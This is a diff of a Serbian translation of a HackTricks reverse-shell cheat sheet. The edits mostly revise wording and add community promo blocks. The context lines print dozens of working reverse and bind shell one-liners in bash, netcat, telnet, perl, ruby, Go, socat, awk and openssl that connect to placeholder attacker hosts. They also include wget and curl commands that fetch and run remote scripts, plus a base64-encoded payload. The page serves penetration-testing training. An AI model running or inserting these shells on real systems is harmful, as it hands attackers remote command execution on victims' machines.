@@ -8,17 +8,25 @@ Drugi načini podrške HackTricks-u:
 
 * Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 **Ako imate pitanja o bilo kojoj od ovih školjki, možete ih proveriti na** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Potpuni TTY
 
-**Kada dobijete reverznu školjku**[ **pročitajte ovu stranicu da biste dobili potpuni TTY**](full-ttys.md)**.**
+**Kada dobijete obrnutu školjku**[ **pročitajte ovu stranicu da biste dobili potpuni TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -33,9 +41,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Bezbedan simbolni shell
-
-Ne zaboravite da proverite i sa drugim shell-ovima: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
+### Bezbedan shell sa simbolima
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -46,10 +52,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Objasnjenje Shell-a
 
-1. **`bash -i`**: Ovaj deo komande pokreće interaktivnu (`-i`) Bash shell.
-2. **`>&`**: Ovaj deo komande je skraćena notacija za **preusmeravanje kako standardnog izlaza** (`stdout`) **tako i standardne greške** (`stderr`) **na istu destinaciju**.
+1. **`bash -i`**: Ovaj deo komande pokreće interaktivnu (`-i`) Bash ljusku.
+2. **`>&`**: Ovaj deo komande je skraćena oznaka za **preusmeravanje kako standardnog izlaza** (`stdout`) **tako i standardne greške** (`stderr`) **na istu destinaciju**.
 3. **`/dev/tcp/<NAPADAC-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP konekciju ka navedenoj IP adresi i portu**.
-* **Preusmeravanjem izlaznih i grešnih tokova u ovaj fajl**, komanda efikasno šalje izlaz interaktivne shell sesije na mašinu napadača.
+* **Preusmeravanjem izlaznih i grešnih tokova u ovaj fajl**, komanda efikasno šalje izlaz interaktivne ljuske sesije ka računaru napadača.
 4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na istu destinaciju kao standardni izlaz (`stdout`)**.
 
 ### Kreiraj u fajlu i izvrši
@@ -59,7 +65,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Napredna ljuska
 
-Kada se suočite sa ranjivošću **Udaljenog izvršenja koda (RCE)** unutar veb aplikacije zasnovane na Linuxu, postizanje reverzne ljuske može biti otežano zbog mrežnih odbrana poput iptables pravila ili složenih mehanizama filtriranja paketa. U takvim ograničenim okruženjima, alternativni pristup uključuje uspostavljanje PTY (Pseudo Terminal) ljuske kako biste efikasnije interagirali sa kompromitovanim sistemom.
+Kada se bavite ranjivošću **Remote Code Execution (RCE)** unutar veb aplikacije zasnovane na Linuxu, postizanje reverzne ljuske može biti otežano mrežnim odbranama poput iptables pravila ili složenih mehanizama filtriranja paketa. U takvim ograničenim okruženjima, alternativni pristup uključuje uspostavljanje PTY (Pseudo Terminal) ljuske kako biste efikasnije interagirali sa kompromitovanim sistemom.
 
 Preporučeni alat za tu svrhu je [toboggan](https://github.com/n3rada/toboggan.git), koji pojednostavljuje interakciju sa ciljnim okruženjem.
 
@@ -95,13 +101,13 @@ Da biste direktno iskoristili interaktivnu ljusku, možete dodati `-b` za integr
 
 Druga mogućnost je korišćenje implementacije `IppSec` forward ljuske [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
-Samo treba da izmenite:
+Samo trebate izmeniti:
 
 - URL ranjivog hosta
 - Prefiks i sufiks vašeg payload-a (ako postoji)
 - Način slanja payload-a (zaglavlja? podaci? dodatne informacije?)
 
-Zatim možete jednostavno **slati komande** ili čak **koristiti komandu `upgrade`** da biste dobili potpunu PTY (imajte na umu da se cevi čitaju i pišu sa oko 1.3s kašnjenja).
+Zatim možete jednostavno **slati komande** ili čak **koristiti komandu `upgrade`** da biste dobili potpuni PTY (imajte na umu da se cevi čitaju i pišu sa oko 1.3s kašnjenja).
 
 ## Netcat
 ```bash
@@ -119,20 +125,20 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet je jednostavan protokol za pristup udaljenom računaru preko mreže.
+Telnet je jednostavan protokol za pristup udaljenom računaru ili uređaju preko mreže. On omogućava korisniku da se prijavi na udaljeni sistem i izvršava komande kao da je direktno povezan sa tim sistemom. Telnet nije siguran protokol jer podaci koji se prenose nisu šifrovani, pa se preporučuje korišćenje sigurnijih alternativa poput SSH-a.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
 telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
-## Ko je
+## Whois
 
 **Napadač**
 ```bash
 while true; do nc -l <port>; done
 ```
-Da biste poslali komandu, zapišite je, pritisnite Enter i pritisnite CTRL+D (da zaustavite STDIN)
+Da biste poslali komandu, napišite je, pritisnite Enter, a zatim pritisnite CTRL+D (da zaustavite STDIN)
 
 **Žrtva**
 ```bash
@@ -152,8 +158,6 @@ perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getpro
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
-
-Ruby je dinamički programski jezik visokog nivoa koji se često koristi za razvoj web aplikacija. On omogućava brzo i jednostavno pisanje koda, što ga čini popularnim izborom među programerima.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -182,8 +186,6 @@ victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
-
-Go je programski jezik koji je razvijen u Google-u. On je dizajniran tako da bude jednostavan za korišćenje, efikasan i pouzdan. Go je često korišćen za razvoj serverskih aplikacija, alata za automatizaciju i softvera za mrežno programiranje.
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
@@ -258,12 +260,6 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
 ### Bind shell
-
-## **Socat**
-
-[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
-
-### Bind shell
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
@@ -274,8 +270,6 @@ attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
-
-Awk je moćan alat za obradu teksta koji se često koristi u shell skriptama. Može se koristiti za pretraživanje i obradu teksta, kao i za izvlačenje i prikazivanje određenih informacija iz datoteka. Awk koristi posebnu sintaksu za definisanje akcija koje treba izvršiti nad podacima, što ga čini veoma fleksibilnim alatom za analizu teksta.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -345,16 +339,22 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
